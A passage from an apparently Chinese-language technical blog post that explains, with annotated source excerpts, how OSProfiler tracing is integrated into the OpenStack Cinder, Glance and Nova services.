class="line">62</span><br></pre></td><td class="code"><pre><span class="line">CONF = cfg.CONF</span><br><span class="line">CONF.register_opts(service_opts)</span><br><span class="line"><span class="keyword">if</span> profiler_opts:</span><br><span class="line">    profiler_opts.set_defaults(CONF)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_profiler</span>(<span class="params">binary, host</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (osprofiler_initializer <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span></span><br><span class="line">            profiler <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span></span><br><span class="line">            profiler_opts <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">        LOG.debug(<span class="string">&#x27;osprofiler is not present&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">        osprofiler_initializer.init_from_conf(</span><br><span class="line">            conf=CONF,</span><br><span class="line">            context=context.get_admin_context().to_dict(),</span><br><span class="line">            project=<span class="string">&quot;cinder&quot;</span>,</span><br><span class="line">            service=binary,</span><br><span class="line">            host=host</span><br><span class="line">        )</span><br><span class="line">        LOG.warning(</span><br><span class="line">            <span class="string">&quot;OSProfiler is enabled.\nIt means that person who knows &quot;</span></span><br><span class="line">            <span class="string">&quot;any of hmac_keys that are specified in &quot;</span></span><br><span class="line">            <span class="string">&quot;/etc/cinder/cinder.conf can trace his requests. \n&quot;</span></span><br><span class="line">            <span class="string">&quot;In real life only operator can read this file so there &quot;</span></span><br><span class="line">            <span class="string">&quot;is no security issue. Note that even if person can &quot;</span></span><br><span class="line">            <span class="string">&quot;trigger profiler, only admin user can retrieve trace &quot;</span></span><br><span class="line">            <span class="string">&quot;information.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;To disable OSProfiler set in cinder.conf:\n&quot;</span></span><br><span class="line">            <span class="string">&quot;[profiler]\nenabled=false&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Service</span>(<span class="params">service.Service</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Service object for binaries running on hosts.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    A service takes a manager and enables rpc by listening to queues based</span></span><br><span class="line"><span class="string">    on topic. It also periodically runs tasks on the manager and reports</span></span><br><span class="line"><span class="string">    it state to the database services table.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Make service_id a class attribute so it can be used for clean up</span></span><br><span class="line">    service_id = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, binary, topic, manager, report_interval=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 periodic_interval=<span class="literal">None</span>, periodic_fuzzy_delay=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 service_name=<span class="literal">None</span>, coordination=<span class="literal">False</span>, cluster=<span class="literal">None</span>, *args,</span></span></span><br><span class="line"><span class="function"><span class="params">                 **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Service, self).__init__()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> rpc.initialized():</span><br><span class="line">            rpc.init(CONF)</span><br><span class="line"></span><br><span class="line">        self.cluster = cluster</span><br><span class="line">        self.host = host</span><br><span class="line">        self.binary = binary</span><br><span class="line">        self.topic = topic</span><br><span class="line">        self.manager_class_name = manager</span><br><span class="line">        self.coordination = coordination</span><br><span class="line">        manager_class = importutils.import_class(self.manager_class_name)</span><br><span class="line">        <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">            manager_class = profiler.trace_cls(<span class="string">&quot;rpc&quot;</span>)(manager_class)    <span class="comment"># 类装饰器</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h2 id="Glance"><a href="#Glance" class="headerlink" title="Glance"></a>Glance</h2><p>相关文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">glance/opts.py                  <span class="comment"># 添加 OSProfiler 选项</span></span><br><span class="line">glance/db/sqlalchemy/api.py     <span class="comment"># 添加数据库追踪</span></span><br><span class="line">glance/cmd/api.py               <span class="comment"># 启用 OSProfiler</span></span><br><span class="line">glance/common/client.py         <span class="comment"># 更新 http 请求头中的追踪信息</span></span><br><span class="line">glance/common/wsgi.py           <span class="comment"># 设置 OSProfiler 默认配置</span></span><br><span class="line">glance/common/wsgi_app.py       <span class="comment"># 启用 OSProfiler</span></span><br></pre></td></tr></table></figure><p><code>glance/opts.py</code> 包含 OSProfiler 选项，作为 oslo_config 的选项，通过 Glance API 获得选项列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_api_opts = [</span><br><span class="line">    (<span class="literal">None</span>, <span class="built_in">list</span>(itertools.chain(</span><br><span class="line">        glance.api.middleware.context.context_opts,</span><br><span class="line">        glance.api.versions.versions_opts,</span><br><span class="line">        glance.common.config.common_opts,</span><br><span class="line">        glance.common.location_strategy.location_strategy_opts,</span><br><span class="line">        glance.common.property_utils.property_opts,</span><br><span class="line">        glance.common.wsgi.bind_opts,</span><br><span class="line">        glance.common.wsgi.eventlet_opts,</span><br><span class="line">        glance.common.wsgi.socket_opts,</span><br><span class="line">        glance.common.wsgi.wsgi_opts,</span><br><span class="line">        glance.common.wsgi.store_opts,</span><br><span class="line">        glance.image_cache.drivers.sqlite.sqlite_opts,</span><br><span class="line">        glance.image_cache.image_cache_opts,</span><br><span class="line">        glance.notifier.notifier_opts,</span><br><span class="line">        glance.scrubber.scrubber_opts))),</span><br><span class="line">    (<span class="string">&#x27;image_format&#x27;</span>, glance.common.config.image_format_opts),</span><br><span class="line">    (<span class="string">&#x27;task&#x27;</span>, glance.common.config.task_opts),</span><br><span class="line">    (<span class="string">&#x27;taskflow_executor&#x27;</span>, <span class="built_in">list</span>(itertools.chain(</span><br><span class="line">        glance.async_.taskflow_executor.taskflow_executor_opts,</span><br><span class="line">        glance.async_.flows.convert.convert_task_opts))),</span><br><span class="line">    (<span class="string">&#x27;store_type_location_strategy&#x27;</span>,</span><br><span class="line">     glance.common.location_strategy.store_type.store_type_opts),</span><br><span class="line">    profiler.list_opts()[<span class="number">0</span>],        <span class="comment"># 添加 OSProfiler 选项</span></span><br><span class="line">    (<span class="string">&#x27;paste_deploy&#x27;</span>, glance.common.config.paste_deploy_opts),</span><br><span class="line">    (<span class="string">&#x27;wsgi&#x27;</span>, glance.common.config.wsgi_opts),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><code>glance/db/sqlalchemy/api.py</code> 添加数据库追踪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_create_facade_lazily</span>():</span></span><br><span class="line">    <span class="keyword">global</span> _LOCK, _FACADE</span><br><span class="line">    <span class="keyword">if</span> _FACADE <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">with</span> _LOCK:</span><br><span class="line">            <span class="keyword">if</span> _FACADE <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                _FACADE = session.EngineFacade.from_config(CONF)</span><br><span class="line">                <span class="comment"># 添加数据库追踪</span></span><br><span class="line">                <span class="keyword">if</span> CONF.profiler.enabled <span class="keyword">and</span> CONF.profiler.trace_sqlalchemy:</span><br><span class="line">                    osprofiler.sqlalchemy.add_tracing(sqlalchemy,</span><br><span class="line">                                                      _FACADE.get_engine(),</span><br><span class="line">                                                      <span class="string">&quot;db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> _FACADE</span><br></pre></td></tr></table></figure><p><code>glance/cmd/api.py</code> 启用 OSProfiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        config.parse_args()</span><br><span class="line">        config.set_config_defaults()</span><br><span class="line">        wsgi.set_eventlet_hub()</span><br><span class="line">        logging.setup(CONF, <span class="string">&#x27;glance&#x27;</span>)</span><br><span class="line">        gmr.TextGuruMeditation.setup_autorun(version)</span><br><span class="line">        notifier.set_defaults()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">            osprofiler.initializer.init_from_conf(      <span class="comment"># 启用 OSProfiler</span></span><br><span class="line">                conf=CONF,</span><br><span class="line">                context=&#123;&#125;,</span><br><span class="line">                project=<span class="string">&quot;glance&quot;</span>,</span><br><span class="line">                service=<span class="string">&quot;api&quot;</span>,</span><br><span class="line">                host=CONF.bind_host</span><br><span class="line">            )</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>glance/common/wsgi.py</code> 设置 OSProfiler 默认配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profiler_opts.set_defaults(CONF)    <span class="comment"># OSProfiler 默认配置</span></span><br></pre></td></tr></table></figure><p><code>glance/common/wsgi_app.py</code> 初始化应用时启用 OSProfiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_setup_os_profiler</span>():</span></span><br><span class="line">    notifier.set_defaults()</span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">        osprofiler.initializer.init_from_conf(conf=CONF,</span><br><span class="line">                                              context=&#123;&#125;,</span><br><span class="line">                                              project=<span class="string">&#x27;glance&#x27;</span>,</span><br><span class="line">                                              service=<span class="string">&#x27;api&#x27;</span>,</span><br><span class="line">                                              host=CONF.bind_host)</span><br></pre></td></tr></table></figure><p><code>glance/common/client.py</code> 更新请求头中的追踪信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClient</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A base client class&quot;&quot;&quot;</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="meta">    @handle_redirects</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_do_request</span>(<span class="params">self, method, url, body, headers</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Connects to the server and issues a request.  Handles converting</span></span><br><span class="line"><span class="string">        any returned HTTP error status codes to OpenStack/Glance exceptions</span></span><br><span class="line"><span class="string">        and closing the server connection. Returns the result data, or</span></span><br><span class="line"><span class="string">        raises an appropriate exception.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param method: HTTP method (&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, etc...)</span></span><br><span class="line"><span class="string">        :param url: urlparse.ParsedResult object with URL information</span></span><br><span class="line"><span class="string">        :param body: data to send (as string, filelike or iterable),</span></span><br><span class="line"><span class="string">                     or None (default)</span></span><br><span class="line"><span class="string">        :param headers: mapping of key/value pairs to add as headers</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :note</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        If the body param has a read attribute, and method is either</span></span><br><span class="line"><span class="string">        POST or PUT, this method will automatically conduct a chunked-transfer</span></span><br><span class="line"><span class="string">        encoding and use the body as a file object or iterable, transferring</span></span><br><span class="line"><span class="string">        chunks of data using the connection&#x27;s send() method. This allows large</span></span><br><span class="line"><span class="string">        objects to be transferred efficiently without buffering the entire</span></span><br><span class="line"><span class="string">        body in memory.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> url.query:</span><br><span class="line">            path = url.path + <span class="string">&quot;?&quot;</span> + url.query</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path = url.path</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            connection_type = self.get_connection_type()</span><br><span class="line">            headers = self._encode_headers(headers <span class="keyword">or</span> &#123;&#125;)</span><br><span class="line">            headers.update(osprofiler.web.get_trace_id_headers())   <span class="comment"># 更新请求头</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h2 id="Nova"><a href="#Nova" class="headerlink" title="Nova"></a>Nova</h2><p>相关文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">nova/config.py             <span class="comment"># 根据配置文件设置 osprofiler</span></span><br><span class="line">nova/service.py            <span class="comment"># 根据配置文件设置驱动，启用 WSGI 中间件</span></span><br><span class="line">nova/profiler.py           <span class="comment"># 重写 WSGI 中间件、类追踪装饰器</span></span><br><span class="line">nova/manager.py            <span class="comment"># 元类</span></span><br><span class="line">nova/rpc.py                <span class="comment"># 追踪上下文序列化/反序列化</span></span><br><span class="line">nova/utils.py              <span class="comment"># spawn/spawn_n 装饰器</span></span><br><span class="line">nova/db/sqlalchemy/api.py  <span class="comment"># 追踪数据库调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 继承抽象基类</span></span><br><span class="line">nova/compute/manager.py</span><br><span class="line">nova/conductor/manager.py</span><br><span class="line">nova/scheduler/manager.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用类装饰器 @profiler.trace_cls(&quot;&quot;)</span></span><br><span class="line">nova/compute/api.py                 <span class="comment"># compute_api</span></span><br><span class="line">nova/compute/rpcapi.py              <span class="comment"># rpc</span></span><br><span class="line">nova/conductor/manager.py           <span class="comment"># rpc</span></span><br><span class="line">nova/conductor/rpcapi.py            <span class="comment"># rpc</span></span><br><span class="line">nova/scheduler/rpcapi.py            <span class="comment"># rpc</span></span><br><span class="line">nova/image/glance.py                <span class="comment"># nova_image</span></span><br><span class="line">nova/network/neutron.py             <span class="comment"># neutron_api</span></span><br><span class="line">nova/virt/libvirt/volume/volume.py  <span class="comment"># volume_api</span></span><br><span class="line">nova/virt/libvirt/vif.py            <span class="comment"># vif_driver</span></span><br></pre></td></tr></table></figure><p><code>nova/config.py</code> 设置 OSProfiler 默认配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_args</span>(<span class="params">argv, default_config_files=<span class="literal">None</span>, configure_db=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">               init_rpc=<span class="literal">True</span></span>):</span></span><br><span class="line">    log.register_options(CONF)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(sean-k-mooney): this filter addresses bug #1825584</span></span><br><span class="line">    <span class="comment"># https://bugs.launchpad.net/nova/+bug/1825584</span></span><br><span class="line">    <span class="comment"># eventlet monkey-patching breaks AMQP heartbeat on uWSGI</span></span><br><span class="line">    rabbit_logger = logging.getLogger(<span class="string">&#x27;oslo.messaging._drivers.impl_rabbit&#x27;</span>)</span><br><span class="line">    rabbit_logger.addFilter(rabbit_heartbeat_filter)</span><br><span class="line"></span><br><span class="line">    set_lib_defaults()</span><br><span class="line">    <span class="keyword">if</span> profiler:</span><br><span class="line">        profiler.set_defaults(CONF)     <span class="comment"># 设置默认配置</span></span><br><span class="line"></span><br><span class="line">    CONF(argv[<span class="number">1</span>:],</span><br><span class="line">         project=<span class="string">&#x27;nova&#x27;</span>,</span><br><span class="line">         version=version.version_string(),</span><br><span class="line">         default_config_files=default_config_files)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> init_rpc:</span><br><span class="line">        rpc.init(CONF)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> configure_db:</span><br><span class="line">        sqlalchemy_api.configure(CONF)</span><br></pre></td></tr></table></figure><p><code>nova/service.py</code> 根据配置文件启用 OSProfiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_profiler</span>(<span class="params">binary, host</span>):</span></span><br><span class="line">    <span class="keyword">if</span> osprofiler <span class="keyword">and</span> CONF.profiler.enabled:</span><br><span class="line">        osprofiler.initializer.init_from_conf(</span><br><span class="line">            conf=CONF,</span><br><span class="line">            context=context.get_admin_context().to_dict(),</span><br><span class="line">            project=<span class="string">&quot;nova&quot;</span>,</span><br><span class="line">            service=binary,</span><br><span class="line">            host=host)</span><br><span class="line">        LOG.info(<span class="string">&quot;OSProfiler is enabled.&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>nova/profiler.py</code> 重写 OSProfiler 装饰器类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重写 WSGI 中间件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WsgiMiddleware</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, application, **kwargs</span>):</span></span><br><span class="line">        self.application = application</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">factory</span>(<span class="params">cls, global_conf, **local_conf</span>):</span></span><br><span class="line">        <span class="keyword">if</span> profiler_web:    <span class="comment"># 调用 osprofiler</span></span><br><span class="line">            <span class="keyword">return</span> profiler_web.WsgiMiddleware.factory(global_conf,</span><br><span class="line">                                                       **local_conf)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">filter_</span>(<span class="params">app</span>):</span></span><br><span class="line">            <span class="keyword">return</span> cls(app, **local_conf)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> filter_</span><br><span class="line"></span><br><span class="line"><span class="meta">    @webob.dec.wsgify</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        <span class="keyword">return</span> request.get_response(self.application)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取元数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_traced_meta</span>():</span></span><br><span class="line">    <span class="keyword">if</span> profiler <span class="keyword">and</span> <span class="string">&#x27;profiler&#x27;</span> <span class="keyword">in</span> CONF <span class="keyword">and</span> CONF.profiler.enabled:</span><br><span class="line">        <span class="keyword">return</span> profiler.TracedMeta</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># NOTE(rpodolyaka): if we do not return a child of type, then Python</span></span><br><span class="line">        <span class="comment"># fails to build a correct MRO when osprofiler is not installed</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">NoopMeta</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> NoopMeta</span><br><span class="line"></span><br><span class="line"><span class="comment"># 包装 osprofiler 类装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trace_cls</span>(<span class="params">name, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Wrap the OSProfiler trace_cls decorator so that it will not try to</span></span><br><span class="line"><span class="string">    patch the class unless OSProfiler is present and enabled in the config</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param name: The name of action. E.g. wsgi, rpc, db, etc..</span></span><br><span class="line"><span class="string">    :param kwargs: Any other keyword args used by profiler.trace_cls</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="keyword">if</span> profiler <span class="keyword">and</span> <span class="string">&#x27;profiler&#x27;</span> <span class="keyword">in</span> CONF <span class="keyword">and</span> CONF.profiler.enabled:</span><br><span class="line">            trace_decorator = profiler.trace_cls(name, kwargs)</span><br><span class="line">            <span class="keyword">return</span> trace_decorator(cls)</span><br><span class="line">        <span class="keyword">return</span> cls</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure><p><code>nova/manager.py</code> 使用元类实现类支持追踪，nova 组件内部的模块都继承该类（<code>ComputeManager</code>、<code>ConductorManager</code>、<code>SchedulerManager</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 元类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ManagerMeta</span>(<span class="params">profiler.get_traced_meta(<span class="params"></span>), <span class="built_in">type</span>(<span class="params">PeriodicTasks</span>)</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Metaclass to trace all children of a specific class.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This metaclass wraps every public method (not starting with _ or __)</span></span><br><span class="line"><span class="string">    of the class using it. All children classes of the class using ManagerMeta</span></span><br><span class="line"><span class="string">    will be profiled as well.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Adding this metaclass requires that the __trace_args__ attribute be added</span></span><br><span class="line"><span class="string">    to the class we want to modify. That attribute is a dictionary</span></span><br><span class="line"><span class="string">    with one mandatory key: &quot;name&quot;. &quot;name&quot; defines the name</span></span><br><span class="line"><span class="string">    of the action to be traced (for example, wsgi, rpc, db).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The OSprofiler-based tracing, although, will only happen if profiler</span></span><br><span class="line"><span class="string">    instance was initiated somewhere before in the thread, that can only happen</span></span><br><span class="line"><span class="string">    if profiling is enabled in nova.conf and the API call to Nova API contained</span></span><br><span class="line"><span class="string">    specific headers.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span>(<span class="params">base.Base, PeriodicTasks, metaclass=ManagerMeta</span>):</span></span><br><span class="line">    __trace_args__ = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;rpc&quot;</span>&#125;    <span class="comment"># 必须</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>nova/rpc.py</code> 实现追踪上下文的序列化（并更新上下文）和反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfilerRequestContextSerializer</span>(<span class="params">RequestContextSerializer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        _context = <span class="built_in">super</span>(ProfilerRequestContextSerializer,</span><br><span class="line">                         self).serialize_context(context)</span><br><span class="line"></span><br><span class="line">        prof = profiler.get()       <span class="comment"># 获取 osprofiler 实例</span></span><br><span class="line">        <span class="keyword">if</span> prof:</span><br><span class="line">            <span class="comment"># FIXME(DinaBelova): we&#x27;ll add profiler.get_info() method</span></span><br><span class="line">            <span class="comment"># to extract this info -&gt; we&#x27;ll need to update these lines</span></span><br><span class="line">            trace_info = &#123;</span><br><span class="line">                <span class="string">&quot;hmac_key&quot;</span>: prof.hmac_key,</span><br><span class="line">                <span class="string">&quot;base_id&quot;</span>: prof.get_base_id(),</span><br><span class="line">                <span class="string">&quot;parent_id&quot;</span>: prof.get_id()</span><br><span class="line">            &#125;</span><br><span class="line">            _context.update(&#123;<span class="string">&quot;trace_info&quot;</span>: trace_info&#125;) <span class="comment"># 添加追踪信息</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> _context</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 